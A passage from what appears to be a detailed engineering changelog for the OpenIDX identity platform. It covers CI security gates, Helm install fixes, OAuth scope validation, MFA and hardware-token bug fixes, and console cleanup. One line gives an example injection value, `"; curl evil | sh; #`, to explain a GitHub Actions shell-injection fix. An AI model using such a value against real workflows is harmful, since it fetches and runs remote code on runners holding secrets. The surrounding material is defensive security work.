       pasted into `docs/` must still be caught). One doc was edited rather
       than allowlisted: `docs/docs/api/authentication.md` printed a
       realistic 43-character refresh token, now `YOUR_REFRESH_TOKEN`.
       Scope is the working tree, not history: a PR can only fix what it
       contains, and purging a rotated secret from history is incident
       response, not a merge gate. An allowlist can be widened until the
       gate is green and blind, and nothing about a green run tells the two
       apart — so the job plants three credentials of shapes that must
       never be allowlisted and **fails if the scanner does not find
       them**.
     - **Semgrep** — off the deprecated `returntocorp/semgrep-action@v1`
       (whose flakiness was the stated reason for `continue-on-error`) onto
       the pinned `semgrep/semgrep` container, failing on `--severity=ERROR`.
       WARNING and INFO still reach the SARIF; blocking on all three tiers
       on a codebase this size produces a gate nobody can clear, and a gate
       nobody can clear is how this job acquired `continue-on-error` in the
       first place.
       **The triage happened in CI, because semgrep would not install in the
       sandbox — and it took five commits to notice.** Security Scanning is a
       separate workflow, so its checks are not in `status-check`'s `needs`;
       every per-commit "CI green" reading here was reading `ci.yml`. That is
       precisely the gap the maintainer action below names, seen from the
       inside. **7 ERROR findings, two rules, all fixed rather than waived
       wholesale:**
       - `run-shell-injection` ×5, in `docs.yml` and
         `windows-client-build.yml`. `${{ github.event.inputs.version }}` and
         `${{ inputs.version }}` are text a user types into a
         `workflow_dispatch` form, substituted by the expression engine
         *before* the shell parses the script — so `"; curl evil | sh; #`
         would run on the runner holding this repository's code-signing
         secrets. Every one now arrives through `env:` and is read as a
         quoted variable. Four more sites the rule did not flag
         (`steps.ver.outputs.version`, which derives from that same input)
         were fixed with them.
       - `detected-bcrypt-hash` ×2 — the seeded default admin's hash, in
         `internal/migrations/sql.go` and `migrations/010_seed_data.up.sql`.
         Public by design: it is the documented first-run credential, the
         setup gate holds the console until it is changed, and
         `ValidateProduction()` refuses to start a production process that
         still has it. Silenced at the line, by rule id, with that reasoning
         in place — not by excluding the files, which would also stop
         catching a real credential pasted into the same migration. Verified
         by applying all 138 migrations to a fresh database afterwards.
     - **License compliance stays informational, and now says why**:
       `go-licenses` classifies by heuristic and misreads vendored and
       dual-licensed modules often enough that blocking would mean arguing
       with the tool. Decision D2 covers the four scanners above, not this.
   - ✅ **`tools/contractcheck` armed** — in the `smoke` job, not
     `ci-web.yml`, because it needs a running stack and that is where one
     exists. The tool extracts, from every `api.get<{...}>()` site, the
     response keys the console is going to read, and diffs them against
     what the services actually return: a key the backend stopped sending
     renders `undefined`/`NaN` while every request answers 200, which no
     status code and no type-check catches. `scripts/smoke-test.sh` writes
     the admin token it already mints to `SMOKE_TOKEN_OUT` (owner-only, and
     only when asked) so the probe reuses it.
     The first run needed a fix in the tool itself. Probed against a single
     base URL — the Go `gateway-service`, which the smoke job already uses
     — **54 of 76 endpoints answered 404** and were filed as "unverified",
     which reads like coverage and is a wall of misses: the console's front
     door is APISIX (nginx sends `/api/v1/` to it), whose `/api/*` catch-all
     carries `/api/v1/ispm/…`, `/api/v1/privacy/…` and the rest to
     admin-api, while `gateway-service` registers six prefixes and no
     catch-all. So `-local` routes each path to the service the edge would
     forward it to, from a prefix map that `edge_test.go` pins against
     `deployments/apisix-edge/seed-edge-routes.sh` itself — with a red case
     proving the pin can still fail.
     Routed correctly: **74 OK, 1 mismatch, 2 unverified** (Guacamole, 503
     with no broker configured — correctly not counted as a shape failure).
     The mismatch was `layout.tsx` declaring `services_count` and
     `identities_count` as required on `/api/v1/access/ziti/status`; the
     handler only returns them in the *enabled* shape, and the indicator
     returns null when Ziti is off — so the type, not the code, was wrong.
     Now optional; the gate is green and blocking.
   - ✅ **`api-contract.test.ts` says something true.** Its premise —
     "there is NO `/api/v1/admin/*` prefix, and neither APISIX nor the
     gateway rewrites one in" — was false: `cmd/gateway-service/main.go`
     registers `router.Group("/api/v1/admin")` and proxies it verbatim.
     The test's *conclusion* holds (measured on a running stack:
     `/api/v1/social-providers` → 200, `/api/v1/admin/social-providers` →
     404, through the gateway and direct), but a reader who greps, finds
     the group, and concludes the test is stale would delete the one thing
     standing between the console and a batch of 404s. The comment now
     states what each router does and cites both. Comparing every console
     path against the route tables is the wider job; response *shapes*,
     the failure that grep cannot see, are now covered by contractcheck
     above.
   - **Maintainer action:** branch protection must list the checks it
     requires. `Required Checks` now covers all of `ci.yml`; jobs in other
     workflows have to be added to the protection rule by name — the docs
     `Docs build clean under --strict`, and Security Scanning's
     `Secret Scanning (Gitleaks)`, `SAST Scan (Semgrep)`,
     `Go Dependency Scan` and `NPM Dependency Scan`.
6. ✅ **CODEOWNERS** — *shipped*. 212 lines naming eighteen `@openidx/*`
   teams became `* @mhmtgngr`. The repository is under a personal
   namespace and cannot have organization teams at all, so under
   "require code-owner review" every rule either no-ops or blocks every PR
   with no reviewer who can clear it — the same phantom-team class already
   purged from `renovate.json`. The two `!` lines went with them: GitHub
   CODEOWNERS has no negation, so they matched nothing while appearing to
   exempt `.github/workflows/`; so did the rule owning the deleted
   `.github/dependabot.yml`. `scripts/check-codeowners.sh` now rejects `!`
   patterns, rules for paths that do not exist, and patterns with no owner
   (which silently disown the subtree they match).
7. ✅ **Agent downloads derived, not written** — *shipped*, and the
   packaging target had never worked. `agent/Makefile`'s `package-linux`
   has existed since the packaging files landed — nfpm config, postinstall,
   systemd unit, desktop entry — and no workflow ran it, so the only agent
   this project has ever published is the Windows MSI and an Android debug
   APK, while the end-user wizard offers five platforms. Running it for the
   first time failed on every invocation:

   ```
   glob failed: ./dist/openidx-agent-linux-${ARCH}: no matching files
   ```

   nfpm expands environment variables in a known set of top-level fields
   (`name`, `arch`, `version`, `maintainer`, …) and **not** inside
   `contents`, so the src path was taken literally. The Makefile now stages
   the arch-specific binary to a fixed path before calling nfpm, and
   `nfpm.yaml` says why. Verified locally with nfpm 2.41.3: four packages,
   `.deb` and `.rpm` × amd64 and arm64, and the arm64 `.deb` carries an
   `ELF aarch64` binary under `Architecture: arm64`.

   A new `package (deb + rpm)` job builds them on every PR touching
   `agent/**` and **asserts there are four** — a count, not a "did nfpm
   exit 0", because that is what a partial build looks like. On an
   `agent-v*` tag they arrive at the publish step as an artifact, so one
   release carries the MSI, `latest.json`, the install script and all four
   packages rather than two jobs racing to create it.

   The console half was already manifest-driven — a platform with no entry
   gets no download button — but its copy said the installer "is provided by
   your administrator" for **every** platform, including the two nobody has:
   there is no macOS installer target at all, and iOS builds in CI and is
   never distributed. Those two now say that, in both catalogs; the moment a
   build exists and lands in the downloads directory the button appears and
   the copy stops being reached.

   `AGENT_DOWNLOADS_DIR` was documented nowhere — not in `.env.example`, not
   on the docs site — for a directory that decides what an end user is
   offered. Both now carry it, with the `gh release download` recipe that
   populates it.

8. ✅ **`/oauth/authorize` validates the scope it is asked for** — found by
   P6.1, not by review. `TestInvalidScopes` has asserted since it was
   written that an unregistered scope comes back as an error, but the
   assertion sat inside `if location != ""` — and while `/authorize`
   rendered a login page there was no `Location`, so it never ran. Deleting
   that page gave every request a `Location`, the assertion became real, and
   it went red: **`/authorize` never checked scope at all.**
   `scopeAllowedForClient` had guarded the token endpoint and the device
   flow for a while; `/authorize` called neither, so a request for a scope
   the client is not registered for was carried to a login screen and only
   refused after credentials had been spent on it. It now fails at
   `/authorize`, reported to the **client** — a redirect to its registered
   `redirect_uri` with `error=invalid_scope`, `error_description` and the
   request's `state`, per RFC 6749 §4.1.2.1 — rather than to a user who
   cannot act on it. Errors before `redirect_uri` is validated stay in-band,
   because redirecting one to an unvalidated URI is an open redirect. Pinned
   by unit tests on the redirect shape (state echoed, absent state not
   invented, the client's own query preserved, an unparseable URI answered
   400) and by the integration assertion that is finally live; the OpenAPI
   spec documents both meanings of the 302.
   **`response_type` is the same shape and is not fixed here:**
   `validateResponseType` exists and `/authorize` does not call it either.
   Every browser client seeded today registers `["code"]`, so it is not
   reachable as a defect, and widening this PR to a second unenforced
   validator on a hunch is not the trade. It goes in P7.4.

9. ✅ **The Helm chart installs — it could not, and nothing said so.** P6.4
   asked for a `kind` job running `make helm-install --wait`, to prove the
   four things the chart claims: the migration hook Job runs, OPA answers at
   the address `config.opaUrl` names, the backup CronJob exists, and the
   NetworkPolicies exist. Writing the job found that a default `helm install`
   has **never** been able to start its own bundled data plane, for three
   independent reasons, none of which `helm lint` or `helm template` can see —
   because every one of them is a value that is only wrong at install time.

   - **The registry key was the Bitnami subcharts'.** `values.yaml` put the
     OpenIDX namespace in `global.imageRegistry`. That key belongs to the
     Bitnami contract: their `common.images.image` prefers the *global* over
     each subchart's own `image.registry`, so PostgreSQL, Redis and
     Elasticsearch all rendered as
     `ghcr.io/mhmtgngr/openidx/bitnami/postgresql:16.2.0-…` — an image that
     has never existed. OpenIDX images now read `global.openidxRegistry`
     through an `openidx.imageRegistry` helper, and `global.imageRegistry`
     ships empty so each subchart falls back to `docker.io`. An operator who
     set only the old key still gets their images from it.
   - **The pinned tags had moved.** Bitnami relocated every non-`latest` tag
     out of `docker.io/bitnami` in August 2025; the tags these chart versions
     pin answer 404 there and 200 under `docker.io/bitnamilegacy`. So even
     with the registry fixed, the data plane could not pull.
   - **The database had two unrelated passwords and no user.** `DATABASE_URL`
     named a role `openidx` that nothing created — `postgresql.auth.username`
     was never set — with `secrets.postgresPassword`, while
     `postgresql.auth.postgresPassword` stayed empty, and an empty value makes
     the Bitnami chart *generate* a random password it keeps in its own
     secret. Redis had the identical split. The bundled stores came up with
     credentials the connection string could not match, so every service —
     the migration Job first — failed to authenticate. Both subcharts now read
     one chart-rendered `openidx-datastore-auth` secret, so
     `secrets.postgresPassword` is the single knob and it is `required`
     rather than silently empty.

   Five more surfaced only because each round of the job got further than
   the last — which is the argument for the job:

   - **`replicaCount: 0` was silently `2`.** `values-ci.yaml` pins every
     service to zero replicas; eight of nine honoured it. `oauth-service`,
     `opa` and both `ziti-fabric` workloads read
     `{{ .Values.x.replicaCount | default 2 }}`, and Go templates treat `0`
     as empty, so the operator's `0` became `2`, the pods pulled `main`'s
     `latest` image and crash-looped for twelve minutes until `--wait` timed
     out. All four use `dig` now, which returns a present key's value
     including zero, and the `Lint & Template` job asserts it for all nine.
   - **The migration role could not create the role the RLS belt needs.**
     Migration v53 provisions `openidx_app` — the `NOSUPERUSER NOBYPASSRLS`
     runtime role the v37 belt is FORCE'd against — and the subchart creates
     `openidx` as a plain LOGIN role: *"permission denied to create role.
     Only roles with the CREATEROLE attribute may create roles."* The two
     ways out are to give the role the application connects with the
     permanent power to mint roles, or to create `openidx_app` before the
     migration looks for it; the chart does the second, and v53's
     `IF NOT EXISTS` guard then skips its own `CREATE ROLE`.
   - **The first attempt at creating it did not run as anyone who could.**
     `postgresql.primary.initdb.scripts` looked like the place for it, and
     round four failed with the same `permission denied to create role` —
     from inside the database container this time. Bitnami runs `.sql` init
     scripts as `POSTGRESQL_INITSCRIPTS_USERNAME`, which defaults to
     `$POSTGRESQL_USER`: `openidx`, the same role that cannot create a role.
     Aiming it at the superuser means `primary.initdb.password`, which the
     subchart renders as a plaintext env value in the StatefulSet pod spec;
     and init scripts run only on the first boot of an empty data directory,
     so an existing install upgrading into this chart version would never get
     the role at all. `templates/db-bootstrap-job.yaml` replaces it: a
     `post-install,pre-upgrade` hook at weight `-1` — strictly before the
     migration Job — that connects as the superuser with the password from
     the Secret the chart already creates, runs v53's `CREATE ROLE` verbatim,
     prints what it left behind, and is gone. Bootstrap is a privileged,
     one-time act; doing it in the open beats granting `CREATEROLE`
     permanently to fix a one-time problem.
   - **And the runtime rewrote the script.** Round five: `syntax error at or
     near "$" at character 4`, against a script that had just been run
     verbatim against a real PostgreSQL 16 and worked. The kubelet expands
     `$(VAR)` references in a container's `command` and `args`, and its escape
     for a literal dollar is a doubled one — so v53's `DO $$ … $$;`, correct
     in the rendered manifest, reached the container as `DO $ … $;`. Nothing
     at render time could see it: the manifest was right and the runtime
     changed it. The script is a mounted ConfigMap now, which is delivered
     byte for byte, and that also makes the rendered chart the thing you can
     run — extract the key from `helm template` and it is what the container
     executes. `Lint & Template` fails on a `$$` in any container command line
     and names the rule; shown red with the script put back inline.
   - **And then the seeds were refused by the belt itself.** Behind that
     failure sat another: the belt FORCEs row-level security so the table
     *owner* is subject to it too, and a migration is cross-org by
     definition — v84 seeds an OAuth client, v138 backfills nine tables. With
     neither `app.org_id` nor `app.bypass_rls` set the policy is fail-closed
     and the seed dies with 42501, "new row violates row-level security
     policy". It had never fired because every environment that runs
     migrations — docker-compose, the CI harness, the test databases —
     connects as `postgres`, which has `BYPASSRLS` and is exempt before any
     policy is consulted. `Migrator.applyMigration` and `rollbackMigration`
     now `SET LOCAL app.bypass_rls = 'on'`, transaction-scoped so it cannot
     escape onto a pooled connection.

   The second and fourth are pinned by
   `internal/migrations/least_privilege_owner_test.go`, which builds that
   deployment in miniature — a `NOSUPERUSER NOCREATEROLE NOBYPASSRLS` owner,
   its own database, the full migration set — and is red without the fix at
   exactly the migration the install would have died on. The `kind` job
   asserts the bootstrap Job succeeded, prints its output, and separately
   asserts `openidx_app` exists afterwards and is neither superuser nor
   `BYPASSRLS`, because a bootstrap that silently did nothing would look
   identical.

   Why it went unnoticed: `values-prod.yaml` disables all three subcharts, so
   the reference deployment never touched them, and rendering is all CI did.
   `scripts/check-chart-images.sh` (self-tested, red on each of the three
   regressions) now catches the naming half statically, and the `kind-install`
   job catches the rest by installing.

   **What the job does and does not prove.** It builds the `tools` image from
   *this* tree, side-loads it, and asserts the migration Job succeeded *and*
   that `schema_migrations` carries the full set — `migrate up` exiting 0
   against an empty database would satisfy the Job alone. It then asserts the
   `opa` Service is on 8281 and answers `/health`, and that the backup CronJob
   and the NetworkPolicy set exist. The eight services and the console run at
   `replicaCount: 0`: their images are published from `main`, so pulling them
   on a PR would test main's binaries against this branch's chart. Their
   Deployments, Services, PDBs and NetworkPolicies are still created and still
   have to satisfy the API server, which is the part the chart owns.

*Exit test:* every new job green on the PR; DoD items 1, 2, 4 and 6 point
at a job.

**Branch protection must list these by name.** `status-check` in `ci.yml`
aggregates that workflow's jobs and cannot reach across workflows, so
`Docs build clean under --strict`, `Secret Scanning (Gitleaks)`,
`SAST Scan (Semgrep)`, `Go Dependency Scan`, `NPM Dependency Scan` and now
`Install on kind` are only blocking if the repository's branch-protection
rule names them. That gap is exactly how Semgrep stayed red for five
commits without anyone noticing.

### P7.4 — The security core, named by a test

The audit listed the handlers and functions that no test in the repository
mentioned by name. Writing the first of them found a control that has never
worked.

1. ✅ **MFA bypass codes never verified.** `VerifyBypassCode` opens a
   transaction, `SELECT … FOR UPDATE`s the user's active codes, and then —
   inside `for rows.Next()`, with the rows still open — issues the `UPDATE`
   that spends the matched code. A pgx transaction is pinned to one connection
   and allows one query on it at a time, so that `Exec` came back
   **`conn busy`** and the function returned `(false, err)`. For every code,
   valid or not. The caller reads that as "wrong code", so the break-glass
   credential an administrator issues to get a locked-out user past MFA simply
   did not work, and nothing said so. It now drains and closes the rows before
   any write — the shape `ValidateBackupCode` already used — and the
   `FOR UPDATE` locks still hold until the transaction ends, so the race the
   transaction exists to prevent is unaffected. A scan of every
   `Query`-then-`Exec` pair in `internal/` and `cmd/` found no second instance:
   the two candidates are a pool (separate connections) and a loop that closes
   its rows first.
   `mfa_bypass_verify_test.go` covers the lifecycle: a single-use code spends
   once and is refused the second time, `max_uses` is honoured to the last use,
   an expired code is refused *and* marked expired, one user's code does not
   work for another, a revoked code is dead, revoking twice fails rather than
   overwriting who revoked it, and `RevokeAllBypassCodes` takes only the active
   codes — leaving a spent code's history alone — and writes no audit entry
   when there was nothing to revoke.
2. ✅ **The token endpoint and the revocation endpoint.** `handleToken`'s
   dispatch table is pinned per grant: the assertion is not that a grant
   succeeds (that needs a database) but that it is *recognised*, because a
   grant that falls through to the default arm is refused as
   `unsupported_grant_type` — indistinguishable from one the product never
   implemented, which is how a grant gets dropped in a refactor with nothing
   going red. `handleRevoke` is unauthenticated by design and always answers
   200 (a 4xx would let a caller probe which tokens exist), so the only thing
   between it and an attacker writing arbitrary Redis keys is the signature
   check before the blacklist write: a token this service signed is
   blacklisted, one signed by another key is not, garbage and `alg=none` are
   not, an already-expired token is not, and `token_type_hint` is treated as
   the hint RFC 7009 says it is.
3. ✅ **The vault's reveal path.** `handleReveal` returns the only plaintext
   this service ever emits, and what it decides is not whether the secret
   exists but which REFUSAL the caller gets. A 403 carrying
   `X-Step-Up-Required` tells the console to run a second-factor challenge and
   retry; a plain 403 means not permitted at all. Answer the first where the
   second is true and the console offers step-up as a route past an
   authorization denial. Covered end to end against a migrated database: no
   reason is a 400, no grant is a plain 403 with no such header, a secret
   flagged `require_step_up` is a 403 that says so *even for an admin* (the
   gate is a fresh factor on the action, not a role), an unknown id is 404 and
   not 403, the happy path returns the plaintext AND writes the checkout-ledger
   row that makes "who saw this, when, and why" answerable, and no refusal
   leaks the value. `handleCheckouts` returns that ledger and carries no
   value/ciphertext field.

   The vault harness migrates a real database rather than hand-rolling the
   tables: the vault's schema is spread over several migrations and carries
   FORCE RLS, and a test that builds its own approximation of `vault_secrets`
   can pass against a shape production does not have.
4. ✅ **The kill switch's guards.** `handleUserKillSwitch` severs a user's
   live access across all three pillars and, with `disable_user`, disables the
   account and deletes the overlay identity. Three checks stand in front of all
   of it, and the existing tests exercised `executeKillSwitch` — the pillar
   work — not the handler. Now pinned: no organization context is a 403 (the
   request cannot say which tenant it acts for, and the user lookup would then
   be unscoped); a user in ANOTHER organization answers exactly what a
   non-existent user answers, byte for byte, and their account is untouched —
   anything else confirms the existence of an account to an administrator with
   no business knowing; and kill-switching your own account is refused, because
   locking yourself out of the console mid-incident is not a recoverable
   mistake and the action looks harmless enough to try.
5. ✅ **Three no-ops and two switches that were never read.** The audit's
   delete list, finished.
   - `middleware.RateLimitConfigFromEnv` documented three environment
     variables in its own comment and read none of them (*"This is a
     placeholder for env-based configuration"*); it had no caller.
     `gateway/middleware.WithCorrelationID` returned its own argument
     unchanged; it had no caller either. Both deleted, with a stale
     "Migration 011-029 would be similarly defined... For brevity" note in
     `migrations/sql.go` that had outlived 128 further migrations.
   - **`ENABLE_MFA` and `ENABLE_AUDIT_LOGGING`.** Bound to struct fields,
     defaulted to `true`, and shipped in `configs/audit-service.yaml` — and no
     line of this codebase ever read either. `ENABLE_MFA=false` got you MFA.
     That is the display-without-enforcement class in its quietest form: not a
     button that lies, a *setting* that lies, to whoever reads the config file
     to find out what this deployment does.
   - Deleting the fields alone would have removed the evidence and left the
     operator's belief intact, so `internal/common/config/retired.go` carries
     the three retired names (`OAUTH_LOGIN_UI` too) with what became of each,
     and `ValidateProductionConfig` logs any that are still set — **in every
     environment**, because development is where someone tries a switch and
     needs to hear that it does nothing. Two tests keep a retired setting from
     coming back by the routes these left by: a viper default or
     `mapstructure` binding in `config.go`, and a line in any shipped
     `configs/*.yaml`. Both shown red against a restored `enable_mfa`.
6. ✅ **The interactive MFA path — two more controls that were not there.**
   Writing the tests for `handleMFAVerify` and `handleMFASendOTP` found both.
   - **SMS and email could not complete a login.** `verifyStepUpFactor`'s doc
     comment says it verifies "using the same verifiers as the primary login
     MFA flow (`handleMFAVerify`)". It did not: step-up had a `case "sms",
     "email"` arm calling `identityService.VerifyOTP`, and `handleMFAVerify`'s
     switch had no arm for either. So `evaluateMFA` offered SMS and email
     whenever they were enrolled, `handleMFASendOTP` delivered the code, the
     console posted it back — and the endpoint answered *"unsupported MFA
     method"*. A user whose only enrolled factor was an OTP could not log in,
     while the same credential re-authenticated them for a sensitive action on
     the same account. `handleMFAVerify` has the arm now, and a test reads the
     case labels out of both switches and fails when they differ, because the
     two are only claimed to be the same verifier set — nothing made them so.
   - **The risk policy's method restriction was written down and never read.**
     `evaluateMFA` filters the offerable factors by what the adaptive-MFA
     policy allows (`assessment.AllowedMethods` — a high-risk login can be
     narrowed to phishing-resistant factors), `createMFASession` pins the
     result into the Redis session, and `service.go`'s own comment says the pin
     exists "so a later `/oauth/mfa-verify` cannot be talked into a method this
     evaluation did not offer". Nothing read `allowed_methods`. The console
     offered the narrowed list and the endpoint took whatever it was handed, so
     a login the policy had restricted to WebAuthn was completable with a TOTP
     code, a backup code or a bypass code — the exact substitution the filter
     exists to prevent. Enforced now at all four consumers of the session
     (`mfa-verify`, `mfa-send-otp`, `mfa-webauthn-begin`, `mfa-push-begin`):
     an excluded factor should not be startable either, and a check that lives
     in one of four doors is one the next change walks around. An absent pin
     stays unrestricted — the passwordless phone flow pins a single
     `required_mfa_method` instead, which is stricter, and sessions live five
     minutes so a rollout's older ones age out.

   Ten of the new sub-cases are red against the code they replace. The router
   in these tests recovers, which is load-bearing rather than tidy: every
   verifier past the gate needs an identity service the harness does not build,
   so "it got through the gate" is an observable 500 and each case stands alone
   instead of the first one panicking and taking the run with it.
7. ✅ **The hardware token — three of the things holding it up were not.**
   A physical second factor is a six-digit code against a shared HOTP/TOTP
   seed, and three things stand between it and an attacker: the counter that
   makes a code single-use, a lockout that makes guessing expensive, and the
   status that makes a revoked token dead. Only the third worked.
   - **The counter advance was fire-and-forget.** `s.db.Pool.Exec(...)` with
     the error dropped, so a write that failed left the counter where it was,
     the function returned `true`, and the same code kept working — silently,
     for as long as the write kept failing. Verification refuses now: a code
     that cannot be spent has not been verified. A trigger that blocks the
     counter update stands in for whatever makes that write fail, and the test
     is red against the old shape.
   - **Nothing counted failures.** `mfa_totp` has carried
     `failed_attempts`/`locked_until` since the throttle work, with a comment
     explaining that a six-digit factor is only a factor if guessing it is
     expensive. Hardware tokens had neither, and are the *wider* target:
     `verifyHOTP` walks a look-ahead of ten counters and `verifyTOTP` accepts a
     ±1 step window, so roughly eleven of a million values are live at any
     instant. The same account was throttled on one factor and not the other.
     Migration **v139** adds the three columns, and the verifier reuses
     `mfa_totp`'s constants and its ordering — the lock is checked *before* the
     code, because a verifier that checks the code first and only then notices
     the lock still leaks whether the guess was right.
   - **Revoking a token that does not exist reported success.** An `UPDATE`
     matching no row succeeds, so `RevokeHardwareToken` and `ReportTokenLost`
     returned nil and wrote a lifecycle event for a token id that was never
     there. An administrator acting on a stale or mistyped id was told the
     credential was dead while it went on working.

   Nine tests, three of them red against the code they replace, covering
   single use, the look-ahead moving *past* the match rather than to it,
   lockout and its release on success, exclusive assignment, a revoked token
   being unusable, an unknown token refusing both lifecycle calls without
   writing an event, and a user with no assigned token.

   Still open on this table and **not** fixed here: `hardware_tokens` has no
   `org_id` and `serial_number` is UNIQUE install-wide, so every query in
   `hardware_token.go` addresses tokens by bare id across tenants. That is the
   orgscope `needsScoping` register (P5.3b) and its own migration — a backfill,
   the RLS belt, and every query in the file — not a rider on this one.
8. ✅ **The separation-of-duties sweep, and the clock it compared against.**
   `evaluateSoDPolicy` blocks a *request* that would create a toxic
   combination; `RunSoDSweep` is the detective half — the control an
   SOX/ISAE/DORA audit actually asks to see — and its whole value is in what it
   does on the second run. It had no test.
   - **The sweep's clock was not the database's.** `sweepStart := time.Now()`
     in Go; `last_detected_at` written by PostgreSQL's `NOW()`; and the
     auto-resolve pass closes every open violation whose `last_detected_at`
     predates `sweepStart`. Two clocks. If the database's is behind this
     process's by a few hundred milliseconds — two hosts, ordinary NTP drift —
     a violation the sweep has *just recorded* is auto-resolved on the spot,
     and the register shows a live toxic combination as "resolved: conflict no
     longer present". That is the worst way for a detective control to fail:
     silently, and in the reassuring direction. `sweepStart` now comes from
     `clock_timestamp()`, so both sides of the comparison are on one clock.
     Honest note: this one is *not* red-provable in a same-host harness — there
     is no skew to induce — so what the tests pin is the behaviour it protects
     (a violation found by a sweep is never closed by that sweep), not the
     defect itself.
   - **A reopened violation kept the note saying it was gone.** The auto-resolve
     appends "[auto-resolved: conflict no longer present]"; the reopen path
     cleared `resolved_at` and left the note, so the register showed a live,
     open violation still claiming the conflict was resolved. It appends
     "[reopened: conflict detected again]" now — appends rather than clears,
     because an operator's own note lives in that column too. Red before the
     fix.

   Eight tests: a conflict is recorded and left open by its own sweep; a
   second identical sweep refreshes rather than duplicating and does not move
   `first_detected_at` (the age of a finding is what an auditor reads);
   remediation auto-resolves and a recurrence reopens the *same* row;
   `waived` is never touched, note and all; `acknowledged` survives while the
   conflict persists; a role plus a *group* still matches, case-insensitively
   (otherwise the control is avoidable by granting the second half through a
   group); disabled policies and disabled users produce nothing; and one org's
   sweep neither scans nor closes another's — the auto-resolve is a bare
   `UPDATE sod_violations`, the shape that has crossed tenants elsewhere here.

   `internal/governance`'s DB harness also gained the
   `OPENIDX_TEST_DATABASE_URL` escape hatch the other four packages carry.
9. ☐ Remaining from the audit's list: `handlePamRevealEntry`,
   `handleApproveRequest`, and the Guacamole session handlers.

   `internal/identity`'s DB harness now also accepts
   `OPENIDX_TEST_DATABASE_URL`, so these can be written and run on a machine
   with Postgres and no Docker daemon; CI keeps using throwaway containers.

### P7 — One console, one client

0. ✅ **The three console items the P7 audit left open.**
   - **The Turkish catalog was in the entry chunk.** `i18n/index.ts` imported
     both catalogs statically — 360 KB of source each — so an English reader
     downloaded and parsed a Turkish catalog before the first paint. Only
     English ships eagerly now; every other locale is a dynamic import behind
     `setLanguage()`, which loads the catalog before switching (calling
     `i18n.changeLanguage` directly would fall back to English with no error,
     which reads as a missing translation rather than a missing fetch).
     Measured: `tr` is its own 288 KB / 86 KB-gzip chunk, fetched only when
     Turkish is chosen. The typing survives — `tr.ts` is still
     `const tr: typeof en`, and `import type` costs nothing at runtime — and a
     test reads `i18n/index.ts` and fails if any locale but `en` is imported
     statically, because re-adding one changes nothing observable at runtime.
   - **One card, two switches for the same feature.** A proxy-route card
     rendered `RouteFeatureToggles` (compact OpenZiti/BrowZer switches) AND,
     once expanded, `ServiceFeaturePanel`'s switches for the same two
     features — both live, sharing the `['service-status', routeId]` cache, so
     flipping either moved the other. The panel is the fuller control (it also
     shows health and the BrowZer path/domain), so it wins while it is on
     screen and the compact pair renders only on a collapsed card. The test is
     red against the old markup: "expected length 1, got 2".
   - **A remote-input surface that failed open.** `remote-support-popout.tsx`
     read `?mode=` and treated anything that was not the literal `view` as
     **interactive** — keyboard and mouse injection into someone else's
     desktop. A typo, a truncated link, a missing parameter: all granted
     control. It is now the other way round: `interactive` only when the URL
     asks for it by that name. The opener always sends the session's own mode,
     so no legitimate flow changes.

   Tests for the three untested security surfaces the audit named:
   `lib/webauthn.ts` (the only place the passkey wire format and the browser's
   ArrayBuffer API meet — 11 cases including a full 256-byte round trip and
   each unpadded base64url length), `add-device.tsx` (the end-user enrolment
   wizard: a download appears only for a platform the manifest lists, iOS and
   macOS say outright that no client is published rather than sending the user
   to an administrator, and "enrolled" is not rendered as "trusted"), and
   `remote-support-popout.tsx` (the fail-safe above). Console suite: 160 files
   / 1178 tests.


1. ✅ **Bilingual for real, and a gate that can see the whole console.**
   Both page globs are recursive (`../pages/**/*.tsx`), which immediately
   exposed what the single-level ones had been hiding: `pages/audit/
   AuditDashboard.tsx`, 471 lines of English on an admin surface, outside
   both the i18n and the accessibility gate for as long as either existed.

   The completeness test now covers `src/components/**` as well. It asks a
   narrower question than the pages one, because most components carry no
   copy at all — the `ui/` primitives take their text as props, and
   demanding `useTranslation` of them would be noise. It asks instead:
   does this file contain a literal string a user would READ — a JSX text
   node of two or more words, or a literal on a copy-bearing prop — and if
   so, does it go through the catalogs? A translated component has no such
   literal left, so it passes by having been done rather than by being
   listed. There is no register to shrink.

   It went red on five components, all now translated:
   `selfheal-panel` (including the tier-1 autonomous-code-fix confirm, whose
   mode help was a module-level map of English that is now a map of catalog
   keys), `manage-app-access-dialog`, `remote-support-viewer`,
   `relay-renderer` and `guac-session-viewer` — the last three being the
   PAM and remote-support windows an operator works inside during an
   incident. `AuditDashboard` went with them.

   **The last two hard-coded locales are gone.** `formatDate` in
   `my-privileged-access-section` and `formatTimestamp` in `AuditDashboard`
   both passed `'en-US'` to `toLocaleDateString`/`toLocaleTimeString`, so a
   request's date stayed American on pages whose every other word followed
   the user's language. Both now take `i18n.language`.

   **~900 LOC of dead code went out with it**, each verified by an unbounded
   grep for importers, not a truncated one: `mfa-setup-wizard.tsx` (663
   lines, a complete second MFA enrolment flow whose only importer was its
   own test — the live surfaces are `pages/user-profile.tsx` for end users
   and `pages/mfa-management.tsx` for admins), `hooks/useWebAuthnCredentials.ts`
   (no importer), `api/mfa.ts` (imported only by that hook), `lib/utils/date.ts`,
   `lib/store/{appStore,authStore,index}.ts` (shadowed by `lib/store.ts`,
   which is what every `from '../lib/store'` actually resolves to),
   `components/ui/index.ts` and the `components/ui/use-toast.ts` it was the
   sole importer of, and `components/audit/index.ts`.
   `pages/login-session.test.tsx` was on the audit's dead list and is **not**
   dead: it imports `./login` and holds three live tests of the
   already-authenticated path. It stays.
2. ✅ **Console controls that were not true.** Four, each a control that
   rendered without doing what it said.

   **The idle lock had no importers.** The server has enforced an idle
   timeout for a while (`internal/oauth/session_policy.go`,
   `session_worker.go`) — a session past its window is revoked and the next
   request fails. What was missing was the half the user experiences: an
   unattended console stayed on screen showing whatever the last page had
   loaded, until someone touched it and got an abrupt 401.
   `hooks/use-idle-timeout.ts` and `components/idle-timeout-dialog.tsx` were
   both written for exactly this and imported by nothing. `layout.tsx` now
   mounts them, and the value comes from the server rather than a constant:
   `GET /oauth/session-info` returns the effective policy for *this* token
   (global settings plus any per-application override), so raising the
   timeout in Settings moves the lock. That endpoint existed and the console
   had never called it; it is readable by any authenticated user, unlike
   `/api/v1/settings`, which matters because this layout wraps the end-user
   pages too. A failed fetch leaves the timeout at 0 — the policy's own
   encoding of "off" — so a hiccup cannot lock anyone out of a working
   console.

   **Device trust reported an outcome it never observed.** `devices.tsx`
   (trust and revoke) and `device-trust-approval.tsx` (approve) each wrote
   the DB row, fired the Ziti overlay sync with `.catch(() => {})`, and
   toasted success unconditionally. The row is what the console shows; the
   overlay is what the network obeys. So an operator could be told a device
   was trusted — or *removed* — while the overlay still said otherwise, and
